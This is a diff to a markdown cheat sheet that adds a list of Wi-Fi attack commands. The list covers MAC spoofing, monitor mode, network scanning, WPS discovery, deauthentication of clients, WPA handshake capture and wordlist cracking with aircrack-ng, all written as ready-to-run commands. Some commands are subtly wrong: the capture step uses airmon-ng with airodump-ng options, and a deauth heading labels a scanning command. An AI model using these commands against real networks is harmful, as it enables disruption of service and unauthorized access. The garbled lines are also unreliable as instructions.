@@ -532,4 +532,62 @@ crunch 6 8 {key length} abc12 {char used} -o test.txt -t a@@@@b
 ```
 aircrack-ng wpa_handshake-01.cap -w test.txt
 ```
-# ===}> [Keep Supporting me on YouTube :yt: ](https://www.youtube.com/@ohm_vishwa)
+# ===}> [Keep Supporting me on YouTube](https://www.youtube.com/@ohm_vishwa)
+---
+---
+---
+
+# Common Commands
+```
+airmon-ng check kill
+```
+```
+ifconfig wlan1 down
+```
+```
+ifconfig wlan1 hw ether 00:11:22:33:44:55
+```
+```
+airmon-ng start wlan1
+```
+```
+ifconfig wlan1 up
+```
+network scanning
+```
+airodump-ng --band abg wlan1
+```
+WPA enabled
+```
+wash --interface wlan1
+```
+deauth
+
+for  all
+```
+aireplay-ng --deauth @1 -a @2 -c @3 wlan1
+```
+for single
+```
+airodump-ng --bssid @1 --channel @2 wlan1
+```
+WPA Handshake
+```
+airmon-ng --bssid @ --channel @ --write wpa_handshake wlan1
+```
+Key cracking
+```
+aircrack-ng wpa_handshake-01.cap -w test.txt
+```
+```
+airmon-ng stop wlan1
+```
+```
+systemctl restart NetworkManager
+```
+```
+service NetworkManager start
+```
+```
+ifconfig wlan1 up
+```
